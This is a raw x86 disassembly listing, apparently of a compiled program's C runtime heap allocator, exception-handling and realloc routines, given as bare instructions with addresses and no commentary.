  4251b7:	mov    ebx,DWORD PTR [edi+0x4]
  4251ba:	cmp    ebx,DWORD PTR [edi+0x8]
  4251bd:	jne    0x425202
  4251bf:	cmp    ecx,0x20
  4251c2:	mov    ebx,0x80000000
  4251c7:	jae    0x4251e3
  4251c9:	shr    ebx,cl
  4251cb:	mov    ecx,DWORD PTR [ebp-0x8]
  4251ce:	lea    ecx,[ecx+eax*1+0x4]
  4251d2:	not    ebx
  4251d4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4251d8:	dec    BYTE PTR [ecx]
  4251da:	jne    0x425202
  4251dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251df:	and    DWORD PTR [ecx],ebx
  4251e1:	jmp    0x425202
  4251e3:	add    ecx,0xffffffe0
  4251e6:	shr    ebx,cl
  4251e8:	mov    ecx,DWORD PTR [ebp-0x8]
  4251eb:	lea    ecx,[ecx+eax*1+0x4]
  4251ef:	not    ebx
  4251f1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4251f8:	dec    BYTE PTR [ecx]
  4251fa:	jne    0x425202
  4251fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251ff:	and    DWORD PTR [ecx+0x4],ebx
  425202:	mov    ecx,DWORD PTR [edi+0x8]
  425205:	mov    ebx,DWORD PTR [edi+0x4]
  425208:	mov    DWORD PTR [ecx+0x4],ebx
  42520b:	mov    ecx,DWORD PTR [edi+0x4]
  42520e:	mov    edi,DWORD PTR [edi+0x8]
  425211:	mov    DWORD PTR [ecx+0x8],edi
  425214:	mov    ecx,DWORD PTR [ebp+0x10]
  425217:	sub    ecx,esi
  425219:	add    DWORD PTR [ebp-0x4],ecx
  42521c:	cmp    DWORD PTR [ebp-0x4],0x0
  425220:	jle    0x4252cb
  425226:	mov    edi,DWORD PTR [ebp-0x4]
  425229:	mov    ecx,DWORD PTR [ebp+0xc]
  42522c:	sar    edi,0x4
  42522f:	dec    edi
  425230:	cmp    edi,0x3f
  425233:	lea    ecx,[ecx+esi*1-0x4]
  425237:	jbe    0x42523c
  425239:	push   0x3f
  42523b:	pop    edi
  42523c:	mov    ebx,DWORD PTR [ebp-0xc]
  42523f:	lea    ebx,[ebx+edi*8]
  425242:	mov    DWORD PTR [ebp+0x10],ebx
  425245:	mov    ebx,DWORD PTR [ebx+0x4]
  425248:	mov    DWORD PTR [ecx+0x4],ebx
  42524b:	mov    ebx,DWORD PTR [ebp+0x10]
  42524e:	mov    DWORD PTR [ecx+0x8],ebx
  425251:	mov    DWORD PTR [ebx+0x4],ecx
  425254:	mov    ebx,DWORD PTR [ecx+0x4]
  425257:	mov    DWORD PTR [ebx+0x8],ecx
  42525a:	mov    ebx,DWORD PTR [ecx+0x4]
  42525d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425260:	jne    0x4252b9
  425262:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425266:	mov    BYTE PTR [ebp+0x13],cl
  425269:	inc    cl
  42526b:	cmp    edi,0x20
  42526e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425272:	jae    0x425290
  425274:	cmp    BYTE PTR [ebp+0x13],0x0
  425278:	jne    0x425288
  42527a:	mov    ecx,edi
  42527c:	mov    ebx,0x80000000
  425281:	shr    ebx,cl
  425283:	mov    ecx,DWORD PTR [ebp+0x8]
  425286:	or     DWORD PTR [ecx],ebx
  425288:	lea    eax,[eax+edx*4+0x44]
  42528c:	mov    ecx,edi
  42528e:	jmp    0x4252b0
  425290:	cmp    BYTE PTR [ebp+0x13],0x0
  425294:	jne    0x4252a6
  425296:	lea    ecx,[edi-0x20]
  425299:	mov    ebx,0x80000000
  42529e:	shr    ebx,cl
  4252a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252a3:	or     DWORD PTR [ecx+0x4],ebx
  4252a6:	lea    eax,[eax+edx*4+0xc4]
  4252ad:	lea    ecx,[edi-0x20]
  4252b0:	mov    edx,0x80000000
  4252b5:	shr    edx,cl
  4252b7:	or     DWORD PTR [eax],edx
  4252b9:	mov    edx,DWORD PTR [ebp+0xc]
  4252bc:	mov    ecx,DWORD PTR [ebp-0x4]
  4252bf:	lea    eax,[edx+esi*1-0x4]
  4252c3:	mov    DWORD PTR [eax],ecx
  4252c5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4252c9:	jmp    0x4252ce
  4252cb:	mov    edx,DWORD PTR [ebp+0xc]
  4252ce:	lea    eax,[esi+0x1]
  4252d1:	mov    DWORD PTR [edx-0x4],eax
  4252d4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4252d8:	jmp    0x425419
  4252dd:	xor    eax,eax
  4252df:	jmp    0x42541c
  4252e4:	jge    0x425419
  4252ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4252ed:	sub    DWORD PTR [ebp+0x10],esi
  4252f0:	lea    ecx,[esi+0x1]
  4252f3:	mov    DWORD PTR [ebx-0x4],ecx
  4252f6:	lea    ebx,[ebx+esi*1-0x4]
  4252fa:	mov    esi,DWORD PTR [ebp+0x10]
  4252fd:	sar    esi,0x4
  425300:	dec    esi
  425301:	cmp    esi,0x3f
  425304:	mov    DWORD PTR [ebp+0xc],ebx
  425307:	mov    DWORD PTR [ebx-0x4],ecx
  42530a:	jbe    0x42530f
  42530c:	push   0x3f
  42530e:	pop    esi
  42530f:	test   BYTE PTR [ebp-0x4],0x1
  425313:	jne    0x425399
  425319:	mov    esi,DWORD PTR [ebp-0x4]
  42531c:	sar    esi,0x4
  42531f:	dec    esi
  425320:	cmp    esi,0x3f
  425323:	jbe    0x425328
  425325:	push   0x3f
  425327:	pop    esi
  425328:	mov    ecx,DWORD PTR [edi+0x4]
  42532b:	cmp    ecx,DWORD PTR [edi+0x8]
  42532e:	jne    0x425372
  425330:	cmp    esi,0x20
  425333:	mov    ebx,0x80000000
  425338:	jae    0x425353
  42533a:	mov    ecx,esi
  42533c:	shr    ebx,cl
  42533e:	lea    esi,[esi+eax*1+0x4]
  425342:	not    ebx
  425344:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425348:	dec    BYTE PTR [esi]
  42534a:	jne    0x42536f
  42534c:	mov    ecx,DWORD PTR [ebp+0x8]
  42534f:	and    DWORD PTR [ecx],ebx
  425351:	jmp    0x42536f
  425353:	lea    ecx,[esi-0x20]
  425356:	shr    ebx,cl
  425358:	lea    ecx,[esi+eax*1+0x4]
  42535c:	not    ebx
  42535e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425365:	dec    BYTE PTR [ecx]
  425367:	jne    0x42536f
  425369:	mov    ecx,DWORD PTR [ebp+0x8]
  42536c:	and    DWORD PTR [ecx+0x4],ebx
  42536f:	mov    ebx,DWORD PTR [ebp+0xc]
  425372:	mov    ecx,DWORD PTR [edi+0x8]
  425375:	mov    esi,DWORD PTR [edi+0x4]
  425378:	mov    DWORD PTR [ecx+0x4],esi
  42537b:	mov    esi,DWORD PTR [edi+0x8]
  42537e:	mov    ecx,DWORD PTR [edi+0x4]
  425381:	mov    DWORD PTR [ecx+0x8],esi
  425384:	mov    esi,DWORD PTR [ebp+0x10]
  425387:	add    esi,DWORD PTR [ebp-0x4]
  42538a:	mov    DWORD PTR [ebp+0x10],esi
  42538d:	sar    esi,0x4
  425390:	dec    esi
  425391:	cmp    esi,0x3f
  425394:	jbe    0x425399
  425396:	push   0x3f
  425398:	pop    esi
  425399:	mov    ecx,DWORD PTR [ebp-0xc]
  42539c:	lea    ecx,[ecx+esi*8]
  42539f:	mov    edi,DWORD PTR [ecx+0x4]
  4253a2:	mov    DWORD PTR [ebx+0x8],ecx
  4253a5:	mov    DWORD PTR [ebx+0x4],edi
  4253a8:	mov    DWORD PTR [ecx+0x4],ebx
  4253ab:	mov    ecx,DWORD PTR [ebx+0x4]
  4253ae:	mov    DWORD PTR [ecx+0x8],ebx
  4253b1:	mov    ecx,DWORD PTR [ebx+0x4]
  4253b4:	cmp    ecx,DWORD PTR [ebx+0x8]
  4253b7:	jne    0x425410
  4253b9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4253bd:	mov    BYTE PTR [ebp+0xf],cl
  4253c0:	inc    cl
  4253c2:	cmp    esi,0x20
  4253c5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4253c9:	jae    0x4253e7
  4253cb:	cmp    BYTE PTR [ebp+0xf],0x0
  4253cf:	jne    0x4253df
  4253d1:	mov    ecx,esi
  4253d3:	mov    edi,0x80000000
  4253d8:	shr    edi,cl
  4253da:	mov    ecx,DWORD PTR [ebp+0x8]
  4253dd:	or     DWORD PTR [ecx],edi
  4253df:	lea    eax,[eax+edx*4+0x44]
  4253e3:	mov    ecx,esi
  4253e5:	jmp    0x425407
  4253e7:	cmp    BYTE PTR [ebp+0xf],0x0
  4253eb:	jne    0x4253fd
  4253ed:	lea    ecx,[esi-0x20]
  4253f0:	mov    edi,0x80000000
  4253f5:	shr    edi,cl
  4253f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4253fa:	or     DWORD PTR [ecx+0x4],edi
  4253fd:	lea    eax,[eax+edx*4+0xc4]
  425404:	lea    ecx,[esi-0x20]
  425407:	mov    edx,0x80000000
  42540c:	shr    edx,cl
  42540e:	or     DWORD PTR [eax],edx
  425410:	mov    eax,DWORD PTR [ebp+0x10]
  425413:	mov    DWORD PTR [ebx],eax
  425415:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425419:	xor    eax,eax
  42541b:	inc    eax
  42541c:	pop    edi
  42541d:	pop    esi
  42541e:	pop    ebx
  42541f:	leave  
  425420:	ret    
  425421:	push   ebp
  425422:	mov    ebp,esp
  425424:	sub    esp,0x14
  425427:	mov    ecx,DWORD PTR [ebp+0x8]
  42542a:	mov    eax,ds:0x45cefc
  42542f:	mov    edx,DWORD PTR ds:0x45cf00
  425435:	add    ecx,0x17
  425438:	and    ecx,0xfffffff0
  42543b:	push   ebx
  42543c:	mov    DWORD PTR [ebp-0x10],ecx
  42543f:	sar    ecx,0x4
  425442:	push   esi
  425443:	lea    eax,[eax+eax*4]
  425446:	push   edi
  425447:	dec    ecx
  425448:	cmp    ecx,0x20
  42544b:	lea    edi,[edx+eax*4]
  42544e:	mov    DWORD PTR [ebp-0x4],edi
  425451:	jge    0x42545e
  425453:	or     esi,0xffffffff
  425456:	shr    esi,cl
  425458:	or     DWORD PTR [ebp-0x8],0xffffffff
  42545c:	jmp    0x42546b
  42545e:	add    ecx,0xffffffe0
  425461:	or     eax,0xffffffff
  425464:	xor    esi,esi
  425466:	shr    eax,cl
  425468:	mov    DWORD PTR [ebp-0x8],eax
  42546b:	mov    eax,ds:0x45cf08
  425470:	mov    ebx,eax
  425472:	mov    DWORD PTR [ebp-0xc],esi
  425475:	cmp    ebx,edi
  425477:	jmp    0x42548d
  425479:	mov    ecx,DWORD PTR [ebx+0x4]
  42547c:	mov    edi,DWORD PTR [ebx]
  42547e:	and    ecx,DWORD PTR [ebp-0x8]
  425481:	and    edi,esi
  425483:	or     ecx,edi
  425485:	jne    0x425492
  425487:	add    ebx,0x14
  42548a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42548d:	mov    DWORD PTR [ebp+0x8],ebx
  425490:	jb     0x425479
  425492:	cmp    ebx,DWORD PTR [ebp-0x4]
  425495:	jne    0x4254bb
  425497:	mov    ebx,edx
  425499:	jmp    0x4254ac
  42549b:	mov    ecx,DWORD PTR [ebx+0x4]
  42549e:	mov    edi,DWORD PTR [ebx]
  4254a0:	and    ecx,DWORD PTR [ebp-0x8]
  4254a3:	and    edi,esi
  4254a5:	or     ecx,edi
  4254a7:	jne    0x4254b3
  4254a9:	add    ebx,0x14
  4254ac:	cmp    ebx,eax
  4254ae:	mov    DWORD PTR [ebp+0x8],ebx
  4254b1:	jb     0x42549b
  4254b3:	cmp    ebx,eax
  4254b5:	je     0x42554f
  4254bb:	mov    DWORD PTR ds:0x45cf08,ebx
  4254c1:	mov    eax,DWORD PTR [ebx+0x10]
  4254c4:	mov    edx,DWORD PTR [eax]
  4254c6:	cmp    edx,0xffffffff
  4254c9:	mov    DWORD PTR [ebp-0x4],edx
  4254cc:	je     0x4254e2
  4254ce:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4254d5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4254d9:	and    ecx,DWORD PTR [ebp-0x8]
  4254dc:	and    edi,esi
  4254de:	or     ecx,edi
  4254e0:	jne    0x425518
  4254e2:	mov    edx,DWORD PTR [eax+0xc4]
  4254e8:	and    edx,DWORD PTR [ebp-0x8]
  4254eb:	and    DWORD PTR [ebp-0x4],0x0
  4254ef:	lea    ecx,[eax+0x44]
  4254f2:	mov    esi,DWORD PTR [ecx]
  4254f4:	and    esi,DWORD PTR [ebp-0xc]
  4254f7:	or     edx,esi
  4254f9:	mov    esi,DWORD PTR [ebp-0xc]
  4254fc:	jne    0x425515
  4254fe:	mov    edx,DWORD PTR [ecx+0x84]
  425504:	and    edx,DWORD PTR [ebp-0x8]
  425507:	inc    DWORD PTR [ebp-0x4]
  42550a:	add    ecx,0x4
  42550d:	mov    edi,DWORD PTR [ecx]
  42550f:	and    edi,esi
  425511:	or     edx,edi
  425513:	je     0x4254fe
  425515:	mov    edx,DWORD PTR [ebp-0x4]
  425518:	mov    ecx,edx
  42551a:	imul   ecx,ecx,0x204
  425520:	lea    ecx,[ecx+eax*1+0x144]
  425527:	mov    DWORD PTR [ebp-0xc],ecx
  42552a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42552e:	xor    edi,edi
  425530:	and    ecx,esi
  425532:	jne    0x4255a1
  425534:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42553b:	and    ecx,DWORD PTR [ebp-0x8]
  42553e:	push   0x20
  425540:	pop    edi
  425541:	jmp    0x4255a1
  425543:	cmp    DWORD PTR [ebx+0x8],0x0
  425547:	jne    0x425554
  425549:	add    ebx,0x14
  42554c:	mov    DWORD PTR [ebp+0x8],ebx
  42554f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425552:	jb     0x425543
  425554:	cmp    ebx,DWORD PTR [ebp-0x4]
  425557:	jne    0x42557f
  425559:	mov    ebx,edx
  42555b:	jmp    0x425566
  42555d:	cmp    DWORD PTR [ebx+0x8],0x0
  425561:	jne    0x42556d
  425563:	add    ebx,0x14
  425566:	cmp    ebx,eax
  425568:	mov    DWORD PTR [ebp+0x8],ebx
  42556b:	jb     0x42555d
  42556d:	cmp    ebx,eax
  42556f:	jne    0x42557f
  425571:	call   0x424f85
  425576:	mov    ebx,eax
  425578:	test   ebx,ebx
  42557a:	mov    DWORD PTR [ebp+0x8],ebx
  42557d:	je     0x425597
  42557f:	push   ebx
  425580:	call   0x42503c
  425585:	pop    ecx
  425586:	mov    ecx,DWORD PTR [ebx+0x10]
  425589:	mov    DWORD PTR [ecx],eax
  42558b:	mov    eax,DWORD PTR [ebx+0x10]
  42558e:	cmp    DWORD PTR [eax],0xffffffff
  425591:	jne    0x4254bb
  425597:	xor    eax,eax
  425599:	jmp    0x425718
  42559e:	shl    ecx,1
  4255a0:	inc    edi
  4255a1:	test   ecx,ecx
  4255a3:	jge    0x42559e
  4255a5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255a8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255ac:	mov    ecx,DWORD PTR [edx]
  4255ae:	sub    ecx,DWORD PTR [ebp-0x10]
  4255b1:	mov    esi,ecx
  4255b3:	sar    esi,0x4
  4255b6:	dec    esi
  4255b7:	cmp    esi,0x3f
  4255ba:	mov    DWORD PTR [ebp-0x8],ecx
  4255bd:	jle    0x4255c2
  4255bf:	push   0x3f
  4255c1:	pop    esi
  4255c2:	cmp    esi,edi
  4255c4:	je     0x4256cb
  4255ca:	mov    ecx,DWORD PTR [edx+0x4]
  4255cd:	cmp    ecx,DWORD PTR [edx+0x8]
  4255d0:	jne    0x42562e
  4255d2:	cmp    edi,0x20
  4255d5:	mov    ebx,0x80000000
  4255da:	jge    0x425602
  4255dc:	mov    ecx,edi
  4255de:	shr    ebx,cl
  4255e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4255e3:	lea    edi,[eax+edi*1+0x4]
  4255e7:	not    ebx
  4255e9:	mov    DWORD PTR [ebp-0x14],ebx
  4255ec:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4255f0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4255f4:	dec    BYTE PTR [edi]
  4255f6:	jne    0x42562b
  4255f8:	mov    ecx,DWORD PTR [ebp-0x14]
  4255fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4255fe:	and    DWORD PTR [ebx],ecx
  425600:	jmp    0x42562e
  425602:	lea    ecx,[edi-0x20]
  425605:	shr    ebx,cl
  425607:	mov    ecx,DWORD PTR [ebp-0x4]
  42560a:	lea    ecx,[eax+ecx*4+0xc4]
  425611:	lea    edi,[eax+edi*1+0x4]
  425615:	not    ebx
  425617:	and    DWORD PTR [ecx],ebx
  425619:	dec    BYTE PTR [edi]
  42561b:	mov    DWORD PTR [ebp-0x14],ebx
  42561e:	jne    0x42562b
  425620:	mov    ebx,DWORD PTR [ebp+0x8]
  425623:	mov    ecx,DWORD PTR [ebp-0x14]
  425626:	and    DWORD PTR [ebx+0x4],ecx
  425629:	jmp    0x42562e
  42562b:	mov    ebx,DWORD PTR [ebp+0x8]
  42562e:	cmp    DWORD PTR [ebp-0x8],0x0
  425632:	mov    ecx,DWORD PTR [edx+0x8]
  425635:	mov    edi,DWORD PTR [edx+0x4]
  425638:	mov    DWORD PTR [ecx+0x4],edi
  42563b:	mov    ecx,DWORD PTR [edx+0x4]
  42563e:	mov    edi,DWORD PTR [edx+0x8]
  425641:	mov    DWORD PTR [ecx+0x8],edi
  425644:	je     0x4256d7
  42564a:	mov    ecx,DWORD PTR [ebp-0xc]
  42564d:	lea    ecx,[ecx+esi*8]
  425650:	mov    edi,DWORD PTR [ecx+0x4]
  425653:	mov    DWORD PTR [edx+0x8],ecx
  425656:	mov    DWORD PTR [edx+0x4],edi
  425659:	mov    DWORD PTR [ecx+0x4],edx
  42565c:	mov    ecx,DWORD PTR [edx+0x4]
  42565f:	mov    DWORD PTR [ecx+0x8],edx
  425662:	mov    ecx,DWORD PTR [edx+0x4]
  425665:	cmp    ecx,DWORD PTR [edx+0x8]
  425668:	jne    0x4256c8
  42566a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42566e:	mov    BYTE PTR [ebp+0xb],cl
  425671:	inc    cl
  425673:	cmp    esi,0x20
  425676:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42567a:	jge    0x42569f
  42567c:	cmp    BYTE PTR [ebp+0xb],0x0
  425680:	jne    0x42568d
  425682:	mov    edi,0x80000000
  425687:	mov    ecx,esi
  425689:	shr    edi,cl
  42568b:	or     DWORD PTR [ebx],edi
  42568d:	mov    ecx,esi
  42568f:	mov    edi,0x80000000
  425694:	shr    edi,cl
  425696:	mov    ecx,DWORD PTR [ebp-0x4]
  425699:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42569d:	jmp    0x4256c8
  42569f:	cmp    BYTE PTR [ebp+0xb],0x0
  4256a3:	jne    0x4256b2
  4256a5:	lea    ecx,[esi-0x20]
  4256a8:	mov    edi,0x80000000
  4256ad:	shr    edi,cl
  4256af:	or     DWORD PTR [ebx+0x4],edi
  4256b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4256b5:	lea    edi,[eax+ecx*4+0xc4]
  4256bc:	lea    ecx,[esi-0x20]
  4256bf:	mov    esi,0x80000000
  4256c4:	shr    esi,cl
  4256c6:	or     DWORD PTR [edi],esi
  4256c8:	mov    ecx,DWORD PTR [ebp-0x8]
  4256cb:	test   ecx,ecx
  4256cd:	je     0x4256da
  4256cf:	mov    DWORD PTR [edx],ecx
  4256d1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4256d5:	jmp    0x4256da
  4256d7:	mov    ecx,DWORD PTR [ebp-0x8]
  4256da:	mov    esi,DWORD PTR [ebp-0x10]
  4256dd:	add    edx,ecx
  4256df:	lea    ecx,[esi+0x1]
  4256e2:	mov    DWORD PTR [edx],ecx
  4256e4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4256e8:	mov    esi,DWORD PTR [ebp-0xc]
  4256eb:	mov    ecx,DWORD PTR [esi]
  4256ed:	test   ecx,ecx
  4256ef:	lea    edi,[ecx+0x1]
  4256f2:	mov    DWORD PTR [esi],edi
  4256f4:	jne    0x425710
  4256f6:	cmp    ebx,DWORD PTR ds:0x45cef8
  4256fc:	jne    0x425710
  4256fe:	mov    ecx,DWORD PTR [ebp-0x4]
  425701:	cmp    ecx,DWORD PTR ds:0x45cf10
  425707:	jne    0x425710
  425709:	and    DWORD PTR ds:0x45cef8,0x0
  425710:	mov    ecx,DWORD PTR [ebp-0x4]
  425713:	mov    DWORD PTR [eax],ecx
  425715:	lea    eax,[edx+0x4]
  425718:	pop    edi
  425719:	pop    esi
  42571a:	pop    ebx
  42571b:	leave  
  42571c:	ret    
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   esi
  425721:	inc    ebx
  425722:	xor    dh,BYTE PTR [eax]
  425724:	pop    eax
  425725:	inc    ebx
  425726:	xor    BYTE PTR [eax],dh
  425728:	push   ebp
  425729:	mov    ebp,esp
  42572b:	sub    esp,0x8
  42572e:	push   ebx
  42572f:	push   esi
  425730:	push   edi
  425731:	push   ebp
  425732:	cld    
  425733:	mov    ebx,DWORD PTR [ebp+0xc]
  425736:	mov    eax,DWORD PTR [ebp+0x8]
  425739:	test   DWORD PTR [eax+0x4],0x6
  425740:	jne    0x4257c8
  425746:	mov    DWORD PTR [ebp-0x8],eax
  425749:	mov    eax,DWORD PTR [ebp+0x10]
  42574c:	mov    DWORD PTR [ebp-0x4],eax
  42574f:	lea    eax,[ebp-0x8]
  425752:	mov    DWORD PTR [ebx-0x4],eax
  425755:	mov    esi,DWORD PTR [ebx+0xc]
  425758:	mov    edi,DWORD PTR [ebx+0x8]
  42575b:	cmp    esi,0xffffffff
  42575e:	je     0x4257c1
  425760:	lea    ecx,[esi+esi*2]
  425763:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425768:	je     0x4257af
  42576a:	push   esi
  42576b:	push   ebp
  42576c:	lea    ebp,[ebx+0x10]
  42576f:	call   DWORD PTR [edi+ecx*4+0x4]
  425773:	pop    ebp
  425774:	pop    esi
  425775:	mov    ebx,DWORD PTR [ebp+0xc]
  425778:	or     eax,eax
  42577a:	je     0x4257af
  42577c:	js     0x4257ba
  42577e:	mov    edi,DWORD PTR [ebx+0x8]
  425781:	push   ebx
  425782:	call   0x4266b0
  425787:	add    esp,0x4
  42578a:	lea    ebp,[ebx+0x10]
  42578d:	push   esi
  42578e:	push   ebx
  42578f:	call   0x4266f2
  425794:	add    esp,0x8
  425797:	lea    ecx,[esi+esi*2]
  42579a:	push   0x1
  42579c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257a0:	call   0x426786
  4257a5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257a8:	mov    DWORD PTR [ebx+0xc],eax
  4257ab:	call   DWORD PTR [edi+ecx*4+0x8]
  4257af:	mov    edi,DWORD PTR [ebx+0x8]
  4257b2:	lea    ecx,[esi+esi*2]
  4257b5:	mov    esi,DWORD PTR [edi+ecx*4]
  4257b8:	jmp    0x42575b
  4257ba:	mov    eax,0x0
  4257bf:	jmp    0x4257dd
  4257c1:	mov    eax,0x1
  4257c6:	jmp    0x4257dd
  4257c8:	push   ebp
  4257c9:	lea    ebp,[ebx+0x10]
  4257cc:	push   0xffffffff
  4257ce:	push   ebx
  4257cf:	call   0x4266f2
  4257d4:	add    esp,0x8
  4257d7:	pop    ebp
  4257d8:	mov    eax,0x1
  4257dd:	pop    ebp
  4257de:	pop    edi
  4257df:	pop    esi
  4257e0:	pop    ebx
  4257e1:	mov    esp,ebp
  4257e3:	pop    ebp
  4257e4:	ret    
  4257e5:	push   ebp
  4257e6:	mov    ecx,DWORD PTR [esp+0x8]
  4257ea:	mov    ebp,DWORD PTR [ecx]
  4257ec:	mov    eax,DWORD PTR [ecx+0x1c]
  4257ef:	push   eax
  4257f0:	mov    eax,DWORD PTR [ecx+0x18]
  4257f3:	push   eax
  4257f4:	call   0x4266f2
  4257f9:	add    esp,0x8
  4257fc:	pop    ebp
  4257fd:	ret    0x4
  425800:	call   0x42370d
  425805:	add    eax,0x8
  425808:	ret    
  425809:	push   0x14
  42580b:	push   0x428768
  425810:	call   0x423858
  425815:	mov    edi,DWORD PTR [ebp+0x8]
  425818:	xor    ebx,ebx
  42581a:	cmp    edi,ebx
  42581c:	jne    0x42582c
  42581e:	push   DWORD PTR [ebp+0xc]
  425821:	call   0x424582
  425826:	pop    ecx
  425827:	jmp    0x4259b0
  42582c:	mov    esi,DWORD PTR [ebp+0xc]
  42582f:	cmp    esi,ebx
  425831:	jne    0x42583f
  425833:	push   edi
  425834:	call   0x42446a
  425839:	pop    ecx
  42583a:	jmp    0x4259ae
  42583f:	cmp    DWORD PTR ds:0x45d144,0x3
  425846:	jne    0x42597a
  42584c:	mov    DWORD PTR [ebp-0x1c],ebx
  42584f:	cmp    esi,0xffffffe0
  425852:	ja     0x425949
  425858:	push   0x4
  42585a:	call   0x423a1f
  42585f:	pop    ecx
  425860:	mov    DWORD PTR [ebp-0x4],ebx
  425863:	push   edi
  425864:	call   0x424c42
  425869:	pop    ecx
  42586a:	mov    DWORD PTR [ebp-0x20],eax
  42586d:	cmp    eax,ebx
  42586f:	je     0x425919
  425875:	cmp    esi,DWORD PTR ds:0x45cf04
  42587b:	ja     0x4258c9
  42587d:	push   esi
  42587e:	push   edi
  42587f:	push   eax
  425880:	call   0x425142
  425885:	add    esp,0xc
  425888:	test   eax,eax
  42588a:	je     0x425891
  42588c:	mov    DWORD PTR [ebp-0x1c],edi
  42588f:	jmp    0x4258c9
  425891:	push   esi
  425892:	call   0x425421
  425897:	pop    ecx
  425898:	mov    DWORD PTR [ebp-0x1c],eax
  42589b:	cmp    eax,ebx
  42589d:	je     0x4258c9
  42589f:	mov    eax,DWORD PTR [edi-0x4]
  4258a2:	dec    eax
  4258a3:	mov    DWORD PTR [ebp-0x24],eax
  4258a6:	cmp    eax,esi
  4258a8:	jb     0x4258ac
  4258aa:	mov    eax,esi
  4258ac:	push   eax
  4258ad:	push   edi
  4258ae:	push   DWORD PTR [ebp-0x1c]
  4258b1:	call   0x4245a0
  4258b6:	push   edi
  4258b7:	call   0x424c42
  4258bc:	mov    DWORD PTR [ebp-0x20],eax
  4258bf:	push   edi
  4258c0:	push   eax
  4258c1:	call   0x424c6d
  4258c6:	add    esp,0x18
  4258c9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4258cc:	jne    0x425919
  4258ce:	cmp    esi,ebx
  4258d0:	jne    0x4258d8
  4258d2:	xor    esi,esi
  4258d4:	inc    esi
  4258d5:	mov    DWORD PTR [ebp+0xc],esi
  4258d8:	add    esi,0xf
  4258db:	and    esi,0xfffffff0
  4258de:	mov    DWORD PTR [ebp+0xc],esi
  4258e1:	push   esi
  4258e2:	push   ebx
  4258e3:	push   DWORD PTR ds:0x45d140
  4258e9:	call   DWORD PTR ds:0x4280a4
  4258ef:	mov    DWORD PTR [ebp-0x1c],eax
  4258f2:	cmp    eax,ebx
  4258f4:	je     0x425919
  4258f6:	mov    eax,DWORD PTR [edi-0x4]
  4258f9:	dec    eax
  4258fa:	mov    DWORD PTR [ebp-0x24],eax
  4258fd:	cmp    eax,esi
  4258ff:	jb     0x425903
  425901:	mov    eax,esi
  425903:	push   eax
  425904:	push   edi
  425905:	push   DWORD PTR [ebp-0x1c]
  425908:	call   0x4245a0
  42590d:	push   edi
  42590e:	push   DWORD PTR [ebp-0x20]
  425911:	call   0x424c6d
  425916:	add    esp,0x14
  425919:	or     DWORD PTR [ebp-0x4],0xffffffff
  42591d:	call   0x425971
  425922:	cmp    DWORD PTR [ebp-0x20],ebx
  425925:	jne    0x425949
  425927:	cmp    esi,ebx
  425929:	jne    0x42592e
  42592b:	xor    esi,esi
  42592d:	inc    esi
  42592e:	add    esi,0xf
  425931:	and    esi,0xfffffff0
  425934:	mov    DWORD PTR [ebp+0xc],esi
  425937:	push   esi
  425938:	push   edi
  425939:	push   ebx
  42593a:	push   DWORD PTR ds:0x45d140
  425940:	call   DWORD PTR ds:0x4280b0
  425946:	mov    DWORD PTR [ebp-0x1c],eax
  425949:	mov    eax,DWORD PTR [ebp-0x1c]
  42594c:	cmp    eax,ebx
  42594e:	jne    0x4259b0
  425950:	cmp    DWORD PTR ds:0x45cdc8,ebx
  425956:	je     0x4259b0
  425958:	push   esi
  425959:	call   0x426142
  42595e:	pop    ecx
  42595f:	test   eax,eax
  425961:	jne    0x42584c
  425967:	jmp    0x4259ae
  425969:	xor    ebx,ebx
  42596b:	mov    esi,DWORD PTR [ebp+0xc]
  42596e:	mov    edi,DWORD PTR [ebp+0x8]
  425971:	push   0x4
  425973:	call   0x42398b
  425978:	pop    ecx
  425979:	ret    
  42597a:	xor    eax,eax
  42597c:	cmp    esi,0xffffffe0
  42597f:	ja     0x425997
  425981:	cmp    esi,ebx
  425983:	jne    0x425988
  425985:	xor    esi,esi
  425987:	inc    esi
  425988:	push   esi
  425989:	push   edi
  42598a:	push   ebx
  42598b:	push   DWORD PTR ds:0x45d140
  425991:	call   DWORD PTR ds:0x4280b0
  425997:	cmp    eax,ebx
  425999:	jne    0x4259b0
  42599b:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a1:	je     0x4259b0
  4259a3:	push   esi
  4259a4:	call   0x426142
  4259a9:	pop    ecx
  4259aa:	test   eax,eax
  4259ac:	jne    0x42597a
